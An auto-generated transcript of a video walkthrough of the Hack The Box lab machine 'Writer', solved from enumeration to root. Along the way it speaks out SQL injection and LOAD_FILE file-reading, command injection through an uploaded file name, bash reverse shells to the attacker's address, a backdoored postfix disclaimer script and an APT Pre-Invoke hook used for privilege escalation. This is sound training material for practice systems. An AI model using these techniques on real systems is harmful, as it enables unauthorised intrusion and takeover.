 what's going on youtube this is ipsec and we're doing writer from hack the box which starts out with finding a web application that's vulnerable to union injection however unlike most sql injections the data in the database isn't really that useful instead you want to use the load file command to extract the web application source to find out it's a flask application and with that you can find a rce to get your shell as dub dub dub data with that you can go into a development applications database find different credentials to get your shell as kyle with kyle you can find out that postfix is configured weirdly you can edit a i think disclaimer text file and get a shell as john and then as john you have the ability to write into the apt configuration directory and put a pre-invoke script in there to get a shell as root so with all that being said let's jump in as always i'm going to start off with an nmap so dash sc for default scripts sv enumerate versions oh a output all formats put in the nmap directory and call it writer and then the ip address of 1010 11.101 this can take some time to run so i've already ran it looking at the results we have a handful of ports open the first one being ssh on port 22 and its banner tells us it's running open ssh and it is also a ubuntu server we also have http on port 80 and its banner tells us it's running apache and also ubuntu then we have smb on 445 and 139 which is a bit weird because it's clearing this is a linux box but based upon the banner we see it is samba so it is running the linux version of the smb daemon so the very first thing i want to do is start off on smb because we can enumerate it pretty quickly i'm going to do dash capital l and 101011.101 and this is going to list shares and we can see the writer 2 project so i'm going to try to access it i'm going to do slash writer 2 underscore project and we can see access denied i'm also going to try null authentication with a dash u and two um quotes and then dash n and we also get access denied the other way i like enumerating smb is always using our pc client so we're going to try 10 10 11 101 and enter a password and we have access denied we can also try null authentication here and see what it gets us and i'm going to try like the noom dom users and we get the username kyle now one of the unintended routes of this would actually be setting up hydro with rocky.txt and brute forcing ssh um we're not going to do that here but if you wanted to you could do that i just liked showing that enumeration so smb doesn't really get us all that inf much information so let's take a look at the web page i'm going to do 1010 11.101 and we see indeed a page i'm going to try getting like index.html we see not found we can try index.php not found just index not found so we're trying to figure out what this web server is i'm going to switch it over to burp suite turn proxy on and then we're just going to send this to the beta tab and look at the headers and all we see is apache so at this point we don't know exactly what the web server is if i had a guess it's probably like python just based upon the urls but that would be a complete guess so let's try running go buster dash u actually before you when you put in dir mode then http 101011 101 word list opt set list discovery web content raft small words dot text and we'll do go buster buster.out can't really do any extensions because we haven't found any yet and let's see if we turn burp suite off we can look at the page source to see if there is anything here and right now i was just looking for anything that would indicate some type of like content management system we see static blog jquery plug-in script and masonry i don't know what this is um let's try googling this real quick go over to google it's a javascript grid layout so that doesn't indicate what exactly the page is uh going back over to go buster we have contact log out about static dashboard and server status let's try server status just to see what is here we don't have permission uh we can go to about which is probably these links here so contact we do have a contact form so let's try putting um ipsec root ipsec dot rocks and we can do image source is equal to 10 10 14 8 slash test slash image we're just testing for some basic like cross-site scripting while we wait for recon to run so pseudo lvnp 80 oh i forgot netcat there we go and i'm also going to intercept this form just to make sure it does indeed work uh does not like my email uh root gmail.com send say are you going into proxy and i don't know it it is it's trying to so if we send this uh we just get a not found which is weird so this contact form does not appear to be working let's take burp suite off and we'll go back to order bust oh god that is all weird formatted but i can just now cat go buster.out and we can see another url uh we have dashboard that we didn't see and also administrative so i'm going to try going to slash dashboard it just brings me back to the main page slash administrative and we have admin login so i'm going to try logging in with like admin admin it says incorrect credentials supplied let's turn burp suite on and we're going to send this over to sql map because i always like having something running in the background so we can let's see where's copy copy the file and we can change this path to be htb whoops hdb and then writer and i'll call this login.request and i guess we can do it on this pane sql map dash r login dot request i think dash b to go in batch mode yeah it didn't ask me any questions so now we are running sql map while we run we can also try like the username kyle because we got that from smb earlier so kyle password try logging in we still get invalid credentials looking back at sql map uh gotta refresh intent redirect response to login page do you want to apply is that ask me a question i think it did so i didn't i guess dash b is not the same as dash dash patch because it is still asking questions so let's go and send this to repeater and play with it so if i go here it says incorrect credential supplied so i'm just going to put that in my search so i can always see one match and then i know that's incorrect so let's try a basic sql injection so or one equals one and we still have one match so incorrect credentials uh we can try putting the same like sql logic in here so username is admin still saying one match so we know that's that if i put a quote afterwards we can see there is no matches and it says welcome admin um we can also do the or one equals one here the reason why we did not need or one equals one in the username is because um the query is probably something like select star from users where username is equal to user and password is equal to password so what we did is put a comment here so this whole piece of the query didn't change what we did in the password field we put it or one equals one because we're matching on this password if we just commented it out we didn't change the query at all so that's why we put one equals one because we're matching the username is admin and that password or anything is true so that's why you don't need or one equals one in the username portion so we have a valid sql injection and looks like the backend is my sequel a skipping test i really should have just done dash dash batch there um it is saying it is union injectable with six columns but before we go too deep into sql map let's just log in so admin comment and log in with password or really doesn't matter what you put there let's see admin and we have a page so we got most visited pages is documentation.html actually a page here 101011 101 no not found so this is probably just um made up stuff we have a menu here stories and we can add a story and it wants image upload so test task test uh let's see one megabyte in jpeg format so what we should do is get an image so let's see we have to find where the images are and the easiest way to get a jpeg is probably just grabbing it off of the web server uh we can do home bg let's see one meg let's just do a small 23k bootstrap logo we could have just looked on our box or downloaded a jpeg from the internet but i like doing it this way so now we have the bootstrap logo.png let's go and um let's see let's move this to be bootstrap logo.php and we can add our php statement to the end so i'm going to do echo dash n php echo ipsec was here i just want to make sure that echoes what i think it is and we'll append this to the bootstrap logo and the reason why i didn't do like a reverse shell or anything because i like keeping it super simple if i go and execute this and see ipsec was here without the echo i know i have code execution if i did like a reverse shell i don't know if the reverse shell failed because of some php configuration waff whatever so always keep my payloads as simple as possible at first so let's try adding a file here let's go home ipsec um htb writer and we can say this file test and let's go intercept off actually let's turn the intercept on file extension must be jpg so let's do move bootstrap to dot jpeg was it eg nope tasktasktest put this and make sure we're intercepting okay we're in repeater and i'm going to change the file name to get rid of this php to see if it was just client-side dashboard settings story i'm looking for anything so we have file extension must be in jpeg i'm going to try jpg.php and it looks like it worked so it uploaded the image so let's go take a look at this directory the static image to see if this is where it actually uploads to oh um you can see me testing the box before i do the video right here i probably should have reverted but oh well uh let's see php so we have this if i look at the if i i guess can curl this let's see we'll call it test binary file and i'm going to the very end and we can see the full php string so we know this did not get executed at all so even though um the reason why i had tried this is because it was running apache so maybe um it would execute php files natively but doesn't look like it does so let's go and look at the next piece so let's see repeater it said this was union injectable so let's try this while we go back to sql map and we can just do dump batch like that so escrow map will dump everything in the database while we manually play with this so union select one and we can see incorrect it said up to six i think in sql map so if i go one two three four five six it does match so we have admin two so i'm guessing right here is where we have the injection welcome admin so here we can try playing with load file to figure out exactly what this web server is so i'm going to do load file and we can say etsy passwd and we have um everything so what i want to do is create a quick python script to replicate this so i'm going to copy this and while that runs we can get out of here v um i'll call it rec.pi i guess and we need to import the request library we also need to import sys so we have ergv and we also need regular expressions so we can say r is equal to request dot post http 101011 101 and it goes to slash administrative then data is equal to data so now we got to put the actual data here whoops so data is equal to and then you name and password so you name sequel to let's do admin union select one load file and we escape this quote and we can do sys.rgv1 thanks that three four five six okay that looks fine then we need password sequel to doesn't really matter anything here we can say please subscribe that looks fine data is equal to data print or dot text so let's try this python 3 rec.pi etsy pass wd and we have an error so that did not work and looking at it i can see why i forgot to put the comment after this so there we go comment is there run it and now we have um regular not real expression the etsy pass to bd file so the next step to do is actually create a rug x to grab this so if we look at this we probably want to grab everything up to slash h3 and it starts after the word um admin so i'm going to create a regular expression so i'm going to call this just regex is equal to re.compile and then r admin and i'm putting what i want to grab in parentheses if i just do this i can show exactly what this will do yeah let's just add this we're going to modify this in a second i just want to show something so down here we can now say match is equal to read.search regex r.text and we can print match group one i think let's see what happens here so we only got one line and that's because by default um regular expressions only match one line in python so in this read.compile we can say e dot dot all which is going to mean this period matches all characters even new lines so now when i run this we have everything starting at or lfi so now we just have to put the termination in and we want to get everything up until h3 so back here we can say slash h3 and when i run the script now we have just the file so the next thing i want to do here is i'm going to pass a lfi word list into this application and we're going to write all the files out so make dur um i'll call it files and what we want to do is let's see print match we don't need that we can just say if match print success else print fail so all i want to do is make sure um i have this if then correct passwd put a bunch of junk and we still have success so print match so it's still an object let's say if match ifmatch.group one none and success does not equal none is that actually a string saying none okay awesome so now this should only um go if the file exists so now i can say with open we can say files slash i think that's what i called it plus we need the file name so what i'm going to do is say fname is equal to sys.org v1 dot replace i'm going to replace all slashes with underscores uh we could use like the path library and make the directory structure and everything but this is a bit quicker and for doing these proof of concepts i like quick so with open that has right let's say as f and f dot right uh match.group one and i think that's all we need so we have files there so i'm going to run my request ls files does not create it put it here and we have etsy passwd so the one thing i don't like right now is all my files begin with a underscore so i'm just going to edit request.pi and we're going to change that real quick so one colon here and that should fix it there we go so now this next step is we have to get a lfi word list and um this was probably the toughest part of the box the word list i liked was i think lfi linux list dot text is this it let's see no this is not it where is the list i want i'm going to add payload to this and is this it nope i don't think so this this is the actual github repo i was looking for it just looks like he may have moved where the file is let's see linux that's not it it's probably web payloads lfi rfi and this this is a really good list you could just do a few find commands on different linux distros and make your own list and i know this is probably a frustrating part of the box to find a good word list you could have just guessed at the path but i always like doing things as automated as possible and this is a good like learning experience so linux payloads all right let's do list.txt and we can paste everything here it's about a thousand lines and what i'm going to do is for i n cat fi linux list dot text do echo i make sure i did that correct awesome and now we can do python 3 rec.pi i and now we're going to call a python script with every single item in this list if i do ls files we can see we are now getting files so this is a really good way to identify what you can do with an lfi right now i'm mainly wanted to get the apache configuration so i can see exactly where this web application exists so this is a good way to do that i'm just going to let my script run for probably five minutes until that finishes and yeah actually we could do a time command so you know how long this actually takes so i'm gonna pause the video and we'll see that it took five minutes so now when i go into this directory uh let me go into files we have a bunch of files here so there's a lot of things in proc we can quickly look at them by just doing a ls-l and looking at the size if i grip on proc we can see everything is zero so that's no help to us looking at ssh we can see like an ssh config the smb config is probably interesting because the smb service was on so if i look at this let's see do we have any password or anything authentication i'm just going to search for kyle oh god how did that happen i hit some hotkey and took me from um less to nano so it looks like the path writer to project um is valid uses smb group guest ok is no writable yes browsable yes so nothing we can really get from that unless we looked at like um etsy groups and we could see kyle is a member of that group we can also see there's a user john within management but let's keep looking through this to see what else there is passwd uh let's see this apache site's enabled0default.com let's take a look at this file and we can see it's giving us the path ver www.writer.htb writer.wsgi the other annoying thing um this is like html or url encoded or html entities anytime there's like a less than or greater than it's replacing it so we can fix that with another sql command so if i did 2 base64 around this load file then it puts everything in base64 encoding so let's try that with a script because when we start pulling these python files um it would get pretty messy so v rec.pi i'm just going to temporarily print match.group 1. actually we don't want to print that let's see if this then let's see import base64 and we can say [Music] output is equal to match.group one dot let's see how do i do it i think it's base64.b64d code like that and print output so let's see what this does real quick python 3 rec.pi etsy passwd incorrect padding do i have to encode this i doubt it i probably just have to find a way to ignore padding let's see python base64 decode ignore padding let's see does this work binary data yes come on it's really not a uh just option you can try this this is becoming a bit more painful than i expected plus equals and we can say match group one is that actually yeah that worked except oh man that is ugly let's see print output.decode utf-8 you have no idea what this just encoded uh let's see maybe getting this in a better format is more hassle than it's worth so we can put a print here uh i'm an idiot we need to base 64. well if you want to know how to deal with padding that is it so now let's see if we can decode it yes print output dot decode there we go f.write what if we have to decode on writes must be string not bytes yes we do decode so now if we um had a file that had these entities let's see uh grep 000 lfi we can grab this let's see less it is etsy apache sites so we can see this greater than less than thing over here if i now run this with the new file less it again now we actually have the correct syntax so that was a long way to do that but oh well let's get this writer.wsgi so put here and we can less ver so only file invar here we can see how this works so user bin python it's importing cis login random os that's not too important from writer import app as application and when python just does like a from directory it's probably going to import um well this is probably writer app wait import app yeah this is probably going into the writer directory and importing app.pi and the comments also telling us there's an init.pi so let's test both of those so where's my python thing so we go writer app.pi for was that it writer import app has application i could have sworn we should have got app.pi i guess not let's try the a net inside of this a net dot pi var writer and now we can see there's two files so let's go a net dot pi and we can see it is indeed a flask application we got a mysql connector username admin the password is tough password to crack um we could try reusing this password so we could try ssh kyle at 10 10 11 101 and try a tough password to crack we don't get it we could do smb client dash u kyle 10 10 11 101. uh what was the path was it writer smb client dash l 10 10 11 101 write it to project and we do authenticate in here and we have smb if i have time that is the intended route through this application but i want to go over that at the end of the video if i have time because i like a different way to exploit this thing so we're looking at this init.pi and just looking at exactly what it does and we see right here if request method post and it does a bunch of things that seem dangerous um let's see os dot path join where is it request file image image request jpeg right here so we're passing user input into os dot system so we should be able to do some type of injection here with urls so let's go back to the application let's see and if we intercepted this request we can also see there is a url option whoa so we can either do file name or url what i'm going to do is we're going to create a malicious file name because we want that file to exist because when we do os system when we do this move command um we're gonna have a semicolon here and then reverse shell so i wonder if we even have to have a valid file um let's actually try it without putting a valid file name so we can do file colon slash slash for dub dub dub we have to get into the whole directory static image and then we can say does not exist dot jpeg and then semicolon i bash c wait bash c i they have tcp 10 10 14 8 9 000 1 0 at one like that and then terminate with a semicolon and nclvmp 9001 if we send this request it comes back right away so it probably did not work so let's simplify this bash thing to get rid of a lot of special characters so i'm going to do echo this base64 and i just want to put a space here because that's going to change this area and i think that's it i was expecting to have to get rid of another character but maybe i don't let's do echo-n base64-d pipe that to bash yep that works wait the shell died immediately so i have some typo here let's figure out what this is see i don't think that would make the difference maybe it does see i put a space here and then we have a padding of two characters so one two and now we have this string so echo dash n base64-d bash and now my command here hung and we have this shell if i type exit this pane doesn't go away so i know i have a valid command now so i'm going to grab this and we can put that here nco vmp send this still nothing i'm going to put it in backtext just in case that matters and nothing so i wonder if we need the file name to actually exist so what i'm going to do is try to get that file created let's see does not exist jpeg so we can do this file name here and we get rid of this url temporarily did this upload file extension must be jpg it was let's see image jpeg see let's just touch so now that file exists on my box so we can try doing the normal image upload with this to see if it still errors because i may have screwed something up in the actual post request uh and i'm assuming this is all working because of when i did test.php i did jpg.php and it still accepted it so i think as long as dot jpg exists it should be fine so let's do intercept on oh shoot i guess we can now go yeah i do want to intercept that request here turn intercept on burp suite's on save so this time it accepted it i'm not sure what was different between these two requests but obviously something was so now when i do this file command let's see if it works now it just hangs because we got a shell so what i did there is that file upload actually created the file in let's see 10 10 10 go here static image it created that file and i bet if we looked at the code it checks that the file exists and then if it does it goes to that os dot move command so now we have a shell as dub dub dub data we can do python 3 c import pty pty dot spawn then bash stty raw minus echo fg enter enter and let's do groups we're dub dub dub data so we have to find a way to um switch to a different user probably because when we looked at um kyle and john both of them were members of weird groups if we do groups kyle he's a member of filter and smb group we do groups john he's a member of management so i want to get over to kyle let's go over www.html now that we can view everything a bit better i'm going to go into writer.htb and we want to find how it's accessing the database so i'm going to grab r mysql and that was a lot more than i expected let's go into writer annette.pi let's see mysql oh it's using the tough password to crack so if we do mysql dash you admin dash p tough password to crack uh i lost focus and it did not type right tough password to crack tough password to crack i wonder if i just specify the database of writer there we go how to specify the database there we can do show tables select star from users and we can get this which looks like it's an md5 sum uh echo dash n md wc-c 32 characters if i go to google we can paste this and it doesn't look like we have anything that's cracking it so i'm not going to bother trying to crack it myself instead let's take a look at what is in writer 2 project and let's see less manage import os this is a django thing if we go to writer v2 there is a settings.pi if i look at settings.pi there is i probably should just fix my terminal export term is equal to x term and then stty dash a rows 26 columns 105 stty rose 26 calls was it 105 yep okay so now when i uh i can now probably vim this file and everything works fine so we have the secret key so we could probably forge cookies if we wanted to it's not in debug mode it's only allowing localhost to access this page so we probably have to tunnel to access it django middleware i'll write a v2 application and we can see in the database it wants to read file etsy my sequel my.com so let's take a look at this file by them this file we go to the bottom we have a different set of credentials we have the dev database django user and django super password so let's do mysql dash u django user dash b and specify the dev database and we can do show tables select star from auth underscore user and we see this is an actual [Music] um hash that has assault and everything so we can't just google this uh we can probably pass it over to hashcat or john i'm going to do john first because my kraken is offline right now and hashcat works better when you have a gpu but i'm just going to do john p w dash dash word list sql to user share word list rock you text using john no passwords loaded bpw maybe i have to use hashcat because it's not detecting this it's weird let's see i wonder if i need to put a dollar first let's do john this john i'm also considering come on shot 1-open ssl is that what it wants if i do format is that going to work no hash is loaded let's put pw at the end so i may be going to turn my box online so we can use hashcat because this does not seem to be working so i've powered on the kraken so let's try if hashcat will auto recognize and work with this hash so let's copy it i'm going to do ssh to kraken and i could have just used my host computer the main thing with hashcat is it really wants a gpu you could use dash dash force to do it without it but it's generally not recommended so um yeah the reason why i don't use my host computer when i'm recording is it's very cpu intensive and i may drop frames and it may just get laggy i'm going to do hashes and we can call this writer paste in this let's just do hash cat and we can say hashes writer i was thinking is it hash file first and it is i was just looking here hash file then the dictionary so we can do opt word list rocky dot text and let's see if it auto recognizes it does we have hash mode 1000 django and it's finished the self test we have begun cracking and let's see if it actually does look at status how long is this going to potentially take uh has not started yet recovered zero out of one speed is pretty slow for this but my progress keeps staying at zero i'm not sure exactly why the candidate hashcat to 24 yeah it's frozen oh it recovered it i'm not sure exactly what hash cap was doing right there but we do have it recovered and if i scroll up we can see the password is whatever this is um you could also just do show and it would also say it there but let's go back to the box and we can try s u dash let's see kyle i'm trying to switch to his user just because that's his password it looks like we do get in uh we can get a better shell with ssh so 1010 11 101 and we are now in i'm going to get rid of this web shell because we don't need any more so now we're kyle if i do groups on kyle um i'm a member of filter and smb group i'm going to look at filter so i can do find slash dash group filter and then we want to if i don't do this to dev null we can see all these permission denieds i'm just going to do two dev null to a standard error so in piping standard error to devnull i also always like using the dash ls uh you need to put that at the end though so we can see the permissions so there is this etsy postfix disclaimer by lesser it is just a bash script um i do etsy post fix let's see master.cf disclaimer we can see um let's just grab disclaimer in this directory disclaimer address it's adding the disclaimer i think the user has to be john i think this is who's executing the disclaimer but it's adding this into when we send messages so i'm going to edit etsy postfix disclaimer and we're just going to put a bash reverse shell here so bash c bash dash i dev tcp 10 10 14 8 9 000 1 0 and 1 like that um i'm also going to open a second thing so kyle at 10 10 11 101 because i would guess this file is going to revert itself for like a self-healing thing so it's just nice to have two different shells so the first thing we want to do is ss lntp to see if we can send mail and we do have smtp listening on localhost so let's do is mail util's not there we can just netcat to localhost 25 and let's see um send mail with net we'll do telnet real quick use telnet for this what is the thing set okay so we need to do hello hello localhost writer.htb okay i don't think we need that exactly but we need mail from so i'm gonna do mail from kyle at writer.htb and then we need to say who it's going to so rcpt to root at writer.htb and then we say data the subject so data subject test mail hello root and then when i hit period it's going to send the message i'm just going to write this again we can see it has been changed since reading it so wrote the file again and we need nclvnp9001 to catch the reverse shell if we send it and there we go so when we sent the mail it executed this disclaimer which sent a reverse shell as john because john was the user uh we saw in the master.cf file so i can do groups here and we can see the shell is a bit weird it did not um give me all my groups when i just did groups we can see it is john but if i cat etsy groups uh cat etsy group we can see management has me so i should be a member of management but um it's not working if i type bash and do groups let's see bash dash p groups nothing see i want it in my home directory i'm going to go to dot ssh i'm going to copy his private key and let's ssh in as him to see if we get that group so let's see uh we can probably get rid of this we don't need this anymore v john paste that chmod 600 sh i john at 10 10 11 101 john so i do groups and now the command is telling me um i'm in management so let's do find slash dash group management to dev null and we can see there's this etsy app aptconfd that we can write to i'm gonna go into this real quick etsyaptapp.com touch test we can right there i just want to test it from this etsy at app.conf.d touch test permission denied so there's something preventing us from getting all the groups when we do it through the send mail thing but as you can see once we did it through um ssh we had that group so i'm not exactly sure what's going in at play but always something to take a look at and when you have a shell also manually verify the group file that it's giving you all the groups because we can see something weird is here but we're a member of this app and we can write into app.conf dot d if we look at the other scripts in here let's do auto remove we can see it's just apt configuration files so this is setting the user agent non-interactive to true and we could look at all of these or one of my favorite things to do when finding a configuration directory we can write to like on a ctf i google persistence around that so i'm doing etsy apt app conf d persistence and we see apt package manager persistence right here and this is pointing us to a metasploit module and let's see it's running apt update pre-invoke and then just a batch command so let's try this so v please subscribe and all i do is app update pre-invoke and then we want a bash thing uh let's see if i do ls i'm just going to take this web shell let's see three right here echo like that and that should send me a reverse shell let's see nc lvmp 9001 look at the date on this and we did not get anything we probably should upload like piece by or something to make sure like apt is actually running in this it is escaping the single quotes but i think this is actually escaping it because of metasploit so let's see i'm just going to upload piece by to this machine we can get rid of these panes see locate piece by uh dollar wait do i not have it piece by github process monitor let's go to releases pspy 64 small save it oh there we go so app update was eventually ran and we got root um if you just go to like ipsec.rocks you can find out other piece by usage if you want to see what i would have done there the other thing we could do if you did apt pre you can see uh this whole ap thing was done before on the inception machine but we're now root on writer so you'll notice that we didn't use any um smb on this box because we did something a unintended way so let's go back and do the intended method of this box and then we'll call it a day let me close out of everything come on okay so the intended way to get a shell as dub dub dub data was through um the smb so if we do s b client dash l 10 10 11 106. so 101 is the ip my bad we can see the writer 2 project and we can also um mount that as kyle so writer 2 project and the password was what tough password to crack and this is a python application i'm going to mount this so it's easier just to view all the files so i'm going to do mount t cifs and then dash o for options i think it's username is equal to kyle password is equal to tough password to crack and if this doesn't work it's probably just user not username now we can mount it over to slash mount uh let's see mount t no match for wait what that's not what i was expecting oh pseudo so now we're attempting to mount and we have mounted it and this is just a python application if i go into mount we can look at manage.pi to see what this is doing um looks like it's just a django thing if i do writer v2 we can see there's a few files here if i go into writer web there is a application by cat admin it's pretty blank apps writer web models this is a very like pretty much empty django application which is a python framework if i look at all the files i had downloaded so if i go back into files we etsy apache 2 um sites enabled we can see there is a virtual host thing listing on 12701 this is all commented out so i'm not exactly sure if there's a second file that's making this server listen but this is where we would be able to access writer v2 so the goal here is we're going to edit a python application a python file here to put a reverse shell and then we have to find a way to access it there is no way we could access this page actually if we looked at the file there was dev.writer.h so we could try setting this so we do sudo v etsy host we can say um 1010 11 101 writer.htb we could try writing it so writer.htb we go to this page if i do dev we go to the same page there's no virtual host routing here the other thing was it was listening on port 8080 potentially and we have this image url thing so we could potentially use this as like a server side request forgery to access things on localhost i'm going to try http colon slash 1010 14 8 slash test.jpg and what we're going to do is nclvnp 180 and we send this and we get a connection the reason why i did jpeg is if we don't have that this page is going to complain that it only accepts um jpegs file extension must end and jpeg so i'm going to do 12701 8080 and we can see it takes a hundred milliseconds let's do 8081 and it's still the same so i was hoping there'd be some type of timing attack so we know um that the port is open the next thing i did is i took off the port took off a number and looked at the bytes and the bytes are the same so this is going to be probably a completely oh wait test.jpg 107 101. so this is a cons nope there was a 98. let's do question mark 140. okay so i think i found a way to identify this server is existing when i was just doing this um it's pretty quick to respond to say hey test.jpg doesn't exist but when i put it in a question mark i'm now getting slash so it's still going to like slash index and we can see it's never mind before i did that a few times it was like 150 milliseconds but um yeah no way to know other than just blindly testing it which is probably why i had missed this when i was doing the box initially and found the other way to do it but let's do writer web let's go into um views i think is that where we this home thing was and we can say import os is it really only read only file has been changed since writing okay i think i can still write to it os dot system and we should do the same reverse shell we have been so we can just grab this echo paste that and see lvnp 9001 save and see if this works does not look like it did i'm guessing it probably did not write i did the force right we can save this and then if i try to view this it still didn't take anything so i'm going to copy views.pi into my home directory of hdb writer and we're going to try using smb client to upload the uh modified one maybe my like um smb mouse just didn't work for whatever reason so import os and then os dot system uh yep that's stole my clipboard so let's do smb client dash capital u kyle 10 10 11 106. so 101 i don't know why i keep thinking um it's that and i don't think that was the correct path now smb client dash capital l 10 10 11 101 write it to underscore project okay tough password to crack dir cd writer v2 is that where we were no let's go into writer web and we can upload views.pi put views dot pi and it looks like it wrote the file and when i make a request to localhost test.jpg it hung this time and we got a shell as dub dub dub data so this was the intended way to get a shell in the box is using through smb um with that being said that's gonna be the video hope you guys enjoyed it take care and i will see you all next week